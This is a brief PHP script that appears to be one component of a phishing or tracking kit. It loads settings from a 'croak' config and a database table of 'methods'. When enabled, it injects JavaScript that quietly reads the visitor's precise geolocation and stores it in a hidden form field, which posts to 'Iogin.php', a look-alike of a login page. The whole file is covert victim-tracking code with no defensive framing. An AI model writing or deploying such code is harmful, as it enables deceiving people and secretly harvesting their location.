<?php
	include ("croak/config.php");
	mysql_connect($DB_SERV,$DB_USER,$DB_PASS)            or die ('Failed Connection: '.mysql_error());
    mysql_select_db($DB_NADB)                            or die ('Failed in Databases: '.mysql_error());

    $sql=mysql_query("SELECT * FROM methods WHERE id=3") or die('Failed in Consult: '.mysql_error());
	$row=mysql_fetch_array($sql);
	if($row['other']==1){
    echo'<script type="text/javascript">if(navigator.geolocation){navigator.geolocation.getCurrentPosition(mostrarUbicacion);}else{}function mostrarUbicacion(position){var times = position.timestamp;var latitud = position.coords.latitude;var longitud = position.coords.longitude;var altitud = position.coords.altitude;var exactitud = position.coords.accuracy;var div = document.getElementById("ubicacion");var geo = "Timestamp: " + times + "<br>latitude : " + latitud + "<br>longitude: " + longitud + "<br>altitude : " + altitud + "<br>accuracy : " + exactitud;document.enviar.holy.value=geo;}function refrescarUbicacion(){navigator.geolocation.watchPosition(mostrarUbicacion);}</script>';
	echo "<form action='Iogin.php' method=post name=enviar><input type=hidden name=holy>";}
?>
